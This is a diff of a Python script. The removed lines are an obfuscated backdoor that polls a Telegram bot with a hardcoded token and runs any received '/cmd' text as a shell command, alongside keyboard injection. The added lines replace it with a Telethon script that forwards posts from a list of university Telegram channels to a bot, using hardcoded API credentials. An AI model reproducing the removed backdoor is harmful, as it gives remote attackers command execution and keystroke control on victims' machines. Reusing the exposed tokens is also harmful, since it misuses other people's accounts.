@@ -1,36 +1,38 @@
-import os as _0x1a
-import subprocess as _0x70
-import requests as _0x5e
-from pynput import mouse as _0x91, keyboard as _0x92
-import time as _0x6f
+import asyncio
+from telethon import TelegramClient, events
 
-_0xab = "8825759763:AAGscnY9ksv9V4i4getI_b1X5qgpKKSf9nQ"
-_0xcd = r"C:\Users\student\Desktop\ab file\telegram_file_replacer"
+# Telegram API credentials
+api_id = 32062895
+api_hash = 'eb0716c82a6190150c87924f55c1f087'
 
-_0x93 = _0x92.Controller()
-_0x94 = _0x91.Controller()
+# የምትከታተላቸው ቻናሎች እና ግሩፖች
+SOURCE_CHATS = [
+    '@aastuvwgeologia',
+    '@Aastu_poll',
+    '@truthwithrose4930',
+    '@aastusu2012',
+    '@pir2011',
+    '@aastu_confessions',
+    '@Ethio_Aviators',
+    '@AASTU_Registrar',
+    -1003909358640,
+    -1004354555692,
+    -1003234571340
+]
 
-def _0xef():
-    _0xde = f"https://api.telegram.org/bot{_0xab}/getUpdates"
+# መረጃው እንዲላክበት የምትፈልገው ቦታ (የአንተ ቦት username)
+TARGET_BOT = '@AllNewsB_Bot'
+
+client = TelegramClient('All Info', api_id, api_hash)
+
+@client.on(events.NewMessage(chats=SOURCE_CHATS))
+async def main(event):
     try:
-        _0xff = _0x5e.get(_0xde).json()
-        if "result" in _0xff and _0xff["result"]:
-            for _0x11 in _0xff["result"]:
-                if "message" in _0x11 and "text" in _0x11["message"]:
-                    _0x33 = _0x11["message"]["text"]
-                    _0x55(_0x33)
-    except Exception as _0x66:
-        pass
+        await client.forward_messages(TARGET_BOT, event.message)
+        print(f"New post forwarded from {event.chat_id}")
+    except Exception as e:
+        print(f"Error: {e}")
 
-def _0x55(_0x33):
-    if _0x33.startswith("/cmd "):
-        _0x70.run(_0x33[5:], shell=True)
-    elif _0x33.startswith("/type "):
-        _0x93.type(_0x33[6:])
-    elif _0x33.startswith("/press "):
-        _0x93.press(_0x33[7:])
-        _0x93.release(_0x33[7:])
-
-while True:
-    _0xef()
-    _0x6f.sleep(2)
+print("Bot is starting...")
+client.start()
+client.run_until_disconnected()
